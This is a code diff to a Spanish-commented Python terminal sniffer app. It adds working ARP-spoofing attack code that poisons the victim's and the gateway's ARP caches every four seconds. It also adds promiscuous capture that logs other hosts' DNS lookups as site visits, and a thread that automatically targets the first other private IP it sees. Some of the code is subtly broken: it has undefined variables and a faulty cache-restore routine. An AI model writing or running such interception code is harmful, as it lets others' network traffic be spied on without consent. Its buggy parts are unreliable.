@@ -5,6 +5,7 @@ import subprocess
 import socket
 import ipaddress
 from datetime import datetime
+import time
 
 # --- AUTO-INSTALACIÓN DE DEPENDENCIAS ---
 def verificar_dependencias():
@@ -22,7 +23,7 @@ from textual.app import App, ComposeResult
 from textual.widgets import Header, Footer, RichLog, Label, Button, ListItem, ListView
 from textual.containers import Horizontal, Vertical
 from textual.screen import ModalScreen
-from scapy.all import sniff, IP, TCP, UDP, ICMP, DNS
+from scapy.all import sniff, IP, TCP, UDP, ICMP, DNS, ARP, send
 
 # --- VENTANA DE DETALLES ---
 class DetalleIPScreen(ModalScreen):
@@ -44,6 +45,7 @@ class DetalleIPScreen(ModalScreen):
         log.write("\n[bold yellow]>> LOG COMPLETO DE EVENTOS[/]")
         if not self.historial: log.write("Sin actividad registrada.")
         for ev in self.historial: log.write(ev)
+        self.victima_seleccionada = None
 
     def on_button_pressed(self, event: Button.Pressed): 
         self.app.pop_screen()
@@ -138,13 +140,21 @@ class SnifferTUI(App):
             if not self.sniffer_activo or IP not in pkt: return
             src, dst = pkt[IP].src, pkt[IP].dst
             
+            # OPTIMIZACIÓN: Solo procesar si es DNS o el inicio de una conexión TCP
+            # Ignoramos los paquetes de datos pesados (Payloads)
+            if not (pkt.haslayer(DNS) or (pkt.haslayer(TCP) and pkt[TCP].flags == "S")):
+                return
+
             if src not in self.seen_ips: self.registrar_dispositivo(src)
             if dst not in self.seen_ips: self.registrar_dispositivo(dst)
 
             if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                 try:
-                    qname = pkt[DNS].qd.qname.decode()
-                    self.registrar_evento(f"dns_{src}_{qname}", f"DNS: {src} busca {qname}", "magenta", src)
+                    qname = pkt[DNS].qd.qname.decode().strip(".")
+                    if not qname.endswith(".local"):
+                        key = f"dns_{src}_{qname}"
+                    #self.registrar_evento(f"dns_{src}_{qname}", f"DNS: {src} busca {qname}", "magenta", src)
+                    self.registrar_evento(key, f"VISITA: {src} -> https://{qname}", "bold magenta", src)
                 except: pass
             elif pkt.haslayer(TCP) and pkt[TCP].flags == "S":
                 self.registrar_evento(f"tcp_{src}_{dst}_{pkt[TCP].dport}", f"TCP: {src} -> {dst}:{pkt[TCP].dport}", "cyan", src)
@@ -158,7 +168,43 @@ class SnifferTUI(App):
                 if len(self.connection_attempts[src]) > 15:
                     self.registrar_evento(f"ids_{src}", f"ALERTA IDS: Escaneo desde {src}", "bold red", src)
 
-        sniff(iface=self.selected_interface, prn=packet_callback, store=0, stop_filter=lambda x: not self.sniffer_activo)
+        sniff(iface=self.selected_interface, prn=packet_callback, store=0, promisc=True, stop_filter=lambda x: not self.sniffer_activo)
+
+    def obtener_gateway_ip(self):
+        try:
+            gateways = psutil.net_gateway()
+            # Retorna la IP del gateway de la interfaz por defecto (AF_INET)
+            return gateways['default'][psutil.AF_INET][0]
+        except Exception:
+            # Si falla, intenta una IP común, pero lo ideal es el autodescubrimiento
+            return "10.0.2.1"
+
+    def realizar_arp_spoofing(self, objetivo_ip, gateway_ip):
+        # Guardamos quién es el objetivo de este hilo específico
+        hilo_objetivo = objetivo_ip
+        
+        # Paquetes de envenenamiento
+        paquete_victima = ARP(op=2, pdst=objetivo_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
+        paquete_router = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=objetivo_ip)
+        
+        self.seguro_update(self.query_one("#event_log").write, f"[bold red]ATAQUE INICIADO:[/] {objetivo_ip}")
+
+        # El bucle solo sigue si el sniffer está activo Y esta IP sigue siendo la seleccionada
+        while self.sniffer_activo and self.victima_seleccionada == hilo_objetivo:
+            try:
+                send(paquete_victima, verbose=False)
+                send(paquete_router, verbose=False)
+                time.sleep(4)
+            except Exception:
+                break
+        
+        # --- RESTAURACIÓN ---
+        # Si salimos del bucle (porque cambiamos de víctima o dimos a STOP), limpiamos la red
+        self.seguro_update(self.query_one("#event_log").write, f"[bold yellow]RESTAURANDO:[/] {hilo_objetivo} ha sido liberado.")
+        
+        # Enviamos paquetes ARP con la información real (MAC broadcast) para re-mapear las tablas ARP
+        paquete_fix = ARP(op=2, pdst=objetivo_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc="ff:ff:ff:ff:ff:ff")
+        send(paquete_fix, count=5, verbose=False)
 
     def registrar_dispositivo(self, ip, es_mio=False):
         if ip in self.seen_ips: return
@@ -181,8 +227,10 @@ class SnifferTUI(App):
     def scan(self, ip):
         try:
             # -T4 y -F para velocidad. Si es nuestra IP local, suele ser casi instantáneo.
-            res = subprocess.run(["nmap", "-sV", "-T4", "-F", ip], capture_output=True, text=True, timeout=30)
-            self.seen_ips[ip]["nmap"] = res.stdout if res.stdout else "No se detectaron servicios abiertos."
+            # Añadimos -O para Sistema Operativo y -sV para servicios
+            # Nota: -O requiere privilegios de administrador/root
+            res = subprocess.run(["nmap", "-sV", "-O", "-T4", "-F", ip], capture_output=True, text=True, timeout=60)
+            self.seen_ips[ip]["nmap"] = res.stdout if res.stdout else "No se detectaron servicios."
             
             # Recuperar el tag para actualizar el label correctamente
             es_mio = (ip == self.mi_ip)
@@ -204,6 +252,25 @@ class SnifferTUI(App):
             
             threading.Thread(target=self.run_sniffer, daemon=True).start()
 
+            # 2. Hilo Lanzador de ARP Dinámico
+            # Creamos una pequeña función interna que espere a ver una IP objetivo
+            def lanzador_dinamico():
+                while self.sniffer_activo:
+                    # Buscamos una IP en la lista que sea interna y no seamos nosotros
+                    objetivo = None
+                    for ip in self.seen_ips:
+                        if ip != self.mi_ip and self.es_ip_privada(ip):
+                            objetivo = ip
+                            break
+                    
+                    if objetivo:
+                        self.seguro_update(self.query_one("#event_log").write, f"[bold cyan]INTERCEPTANDO:[/] Objetivo detectado -> {objetivo}")
+                        self.realizar_arp_spoofing(objetivo, gateway)
+                        break
+                    time.sleep(2)
+
+            threading.Thread(target=lanzador_dinamico, daemon=True).start()
+
     def stop_sniffer(self):
         self.sniffer_activo = False
         self.query_one("#event_log").write("[bold yellow]STOP: MONITOREO DETENIDO[/]")
@@ -222,10 +289,39 @@ class SnifferTUI(App):
         if event.list_view.id == "iface_list":
             self.selected_interface = event.item.id
         elif event.list_view.id == "device_list":
-            target_ip = next((ip for ip, d in self.seen_ips.items() if d["widget"] == event.item.children[0]), None)
-            if target_ip:
-                data = self.seen_ips[target_ip]
-                self.push_screen(DetalleIPScreen(target_ip, data["nmap"], data["historial"]))
+            try:
+                # Usamos .render() en lugar de .renderable para obtener el texto
+                label_widget = event.item.children[0]
+                label_text = str(label_widget.render()) 
+                
+                # Extraemos la IP de forma más robusta
+                target_ip = label_text.split("IP: ")[1].split(" ")[0]
+                
+                # 1. Si es nuestra propia IP, solo mostramos detalles
+                if target_ip == self.mi_ip:
+                    data = self.seen_ips[target_ip]
+                    self.push_screen(DetalleIPScreen(target_ip, data["nmap"], data["historial"]))
+                    return
+
+                # 2. Si es una IP interna ajena, fijamos objetivo e interceptamos
+                if self.es_ip_privada(target_ip):
+                    self.victima_seleccionada = target_ip
+                    gateway = self.obtener_gateway_ip()
+                    
+                    self.query_one("#event_log").write(f"[bold red]OBJETIVO FIJADO:[/] Interceptando {target_ip}")
+                    
+                    threading.Thread(
+                        target=self.realizar_arp_spoofing, 
+                        args=(target_ip, gateway), 
+                        daemon=True
+                    ).start()
+                    
+                    # Abrir detalles
+                    data = self.seen_ips[target_ip]
+                    self.push_screen(DetalleIPScreen(target_ip, data["nmap"], data["historial"]))
+            
+            except Exception as e:
+                self.query_one("#event_log").write(f"[bold red]ERROR al seleccionar:[/] {str(e)}")
 
     def on_button_pressed(self, event):
         if event.button.id == "start": self.start_sniffer()
